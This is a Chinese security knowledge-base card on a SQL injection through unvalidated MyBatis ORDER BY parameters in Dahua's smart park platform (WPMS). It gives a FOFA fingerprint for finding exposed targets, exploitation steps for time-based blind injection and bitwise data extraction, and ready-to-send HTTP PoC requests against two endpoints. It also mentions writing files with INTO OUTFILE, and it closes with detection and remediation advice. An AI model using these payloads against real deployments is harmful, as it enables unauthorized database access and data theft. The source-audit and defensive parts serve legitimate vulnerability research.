---
id: web-java-component-dahua-wpms-mybatis-orderby-sqli
title: 大华智慧园区 MyBatis ORDER BY 排序参数 SQL 注入（Material/Player bycondition 接口）
type: scenario
domain: web
path: web/java/component
technique: dahua-wpms-mybatis-orderby-sqli
tags:
- java
- dahua
- wpms
- mybatis
- sqli
- order-by
- spring-mvc
- conditionvo
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V211
  verified_at: '2026-11-07T04:48:51+08:00'
  notes: 已对照原文与 img27-39 核对：/material/bycondition/single 与 /player/bycondition/single 路由、ConditionVO sortBy/sortOrder、publishing_material_mapper.xml 与 publishing_player_mapper.xml 的 ORDER BY ${sortBy} ${sortOrder} 均与原文一致。未验证点：原文只做源码审计，未附实际注入响应；卡片 PoC 按源码构造，未实测。
url: /docs/web/java/component/web-java-component-dahua-wpms-mybatis-orderby-sqli/
draft: false
kb_aliases:
- 大华智慧园区 SQL 注入
- 大华 WPMS sortBy 注入
- getMaterialPageBySingleCondition
- getPlayerPageBySingleCondition
- MyBatis ORDER BY ${}
- ConditionVO sortOrder
---

## 一句话结论

大华智慧园区平台的 `/material/bycondition/single` 与 `/player/bycondition/single` 把请求绑定的 `ConditionVO.sortBy/sortOrder` 原样放进 MyBatis mapper 的 `ORDER BY ${sortBy} ${sortOrder}`，可注入任意 SQL 片段（时间盲注/报错/联合查询取决于数据库），从列表接口读取数据库数据。

## 原理

- MyBatis 的 `#{}` 会编译成 JDBC `?` 占位符、按数据绑定；`${}` 是在 SQL 解析前做纯文本替换。`ORDER BY` 后面的列名/方向属于 SQL 标识符位置，不能用 `?` 绑定，因此开发者常用 `${}`，一旦参数来自请求就直接进入 SQL 语法层（见 [[web-generic-sqli-mybatis-dollar-brace-injection]]、[[web-generic-sqli-java-identifier-table-order-by-injection]]）。
- `ConditionVO` 的 `singleCondition` getter 调用了 `StringUtil.likeEscape`，但 `sortBy`/`sortOrder` 没有做任何转义或白名单。
- `MaterialController.getMaterialPageBySingleCondition`（`@RequestMapping("/material/bycondition/single", POST)`）把 `conditionVO.getSortBy()`、`getSortOrder()` 放进 `conditions` map，经 service/DAO 传入 `publishing_material_mapper.xml` 的 `getMaterialPageByCombinedCondition`，最终拼成 `ORDER BY ${sortBy} ${sortOrder}`。
- `PlayerController.getPlayerPageBySingleCondition`（`@RequestMapping("/player/bycondition/single", POST)`）走同样的链路，`publishing_player_mapper.xml` 的 `getPlayerPageBySingleCondition` 也拼 `ORDER BY ${sortBy} ${sortOrder}`。
- 由于注入点在 ORDER BY，攻击者不需要闭合引号；MySQL 可用子查询 `(SELECT 1 FROM (SELECT SLEEP(5))x)` 做时间盲注，或用报错函数/布尔条件逐位提取数据。不同数据库语法不同。
- 边界：本文只做源码审计，未给出实际注入响应/数据提取截图；实际可利用性取决于数据库类型、排序语句上下文和权限（是否只读）。

## 触发条件

- 目标为大华智慧园区综合管理平台（FOFA 指纹 `"/WPMS/asset/lib/gridster/"`），对应 Controller 可从攻击者网络访问。
- 请求参数能绑定到 `ConditionVO` 的 `sortBy`、`sortOrder`（表单/查询参数）。
- MyBatis mapper 使用 `${sortBy} ${sortOrder}` 且没有列名白名单/排序方向校验。
- 数据库账号有查询权限；时间盲注需要可执行 `SLEEP` 等函数。

## 利用步骤

1. 访问 `/material/bycondition/single` 或 `/player/bycondition/single`（POST），先传合法排序参数确认接口返回列表，例如 `sortBy=MATERIAL_NAME&sortOrder=asc`。
2. 在 `sortBy` 后追加子查询/条件，保持 `sortOrder=asc`；先用时间盲注确认：
   `sortBy=MATERIAL_NAME,(SELECT 1 FROM (SELECT SLEEP(5))x)&sortOrder=asc`。
3. 观察响应时间是否稳定延迟约 5 秒；若无延迟，尝试报错注入（`updatexml`/`extractvalue`）或布尔条件。
4. 用条件子查询逐位提取库名/表名/数据，例如把 `SLEEP(5)` 换成 `IF(ASCII(SUBSTR((SELECT ...),1,1))>N,SLEEP(5),0)`。
5. 对 `/player/bycondition/single` 重复同样测试（只需把列名换成 `PLAYER_NAME` 等合法列）。

## PoC

```http
POST /material/bycondition/single HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: ...

pageNum=1&pageSize=10&sortBy=MATERIAL_NAME,(SELECT 1 FROM (SELECT SLEEP(5))x)&sortOrder=asc
```

```http
POST /player/bycondition/single HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

pageNum=1&pageSize=10&sortBy=PLAYER_NAME,(SELECT 1 FROM (SELECT SLEEP(5))x)&sortOrder=asc
```

```sql
-- mapper 中的危险写法（示意）
ORDER BY ${sortBy} ${sortOrder}
```

## 变体与关联

- 变体：同一平台的 `attachment_clearTempFile.action` 还存在 `bean.recId` 的 JDBC 字符串拼接注入（见 [[web-java-component-dahua-attachment-cleartempfile-recid-sqli]]）。
- 变体：其他使用 `ConditionVO`/`PageVo` 的列表接口可能复用同一 mapper，可批量测试 `sortBy`/`sortOrder`。
- 变体：ORDER BY 注入可结合 `INTO OUTFILE` 写文件、`UPDATEXML` 报错、时间盲注；MySQL 8 可用 `GTID_SUBSET` 等。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]、[[web-generic-sqli-pagevo-sort-orderby-pagesql-injection]]、[[web-generic-sqli-java-identifier-table-order-by-injection]]、[[web-generic-sqli-order-by-into-outfile-filename-webshell]]。
- 边界：`ORDER BY` 后的子查询在部分数据库/版本受限；原文未给出实际注入结果，需在授权环境验证。

## 检测与防御

- **检测特征**：`sortBy`/`sortOrder` 出现逗号、括号、`SELECT`、`SLEEP`、`CASE`、注释符等；同一接口响应时间周期性延迟；数据库错误信息回显。
- **修复**：把 `sortBy` 映射到固定列名白名单（如 `Map<String,String>`），`sortOrder` 只允许 `asc/desc`；MyBatis 用 `${}` 前必须经过服务端白名单校验，禁止直接拼接请求参数。
- **加固**：数据库账号最小权限、关闭 `INTO OUTFILE`/文件权限；WAF 拦截 ORDER BY 注入关键字；统一分页组件做排序参数校验。
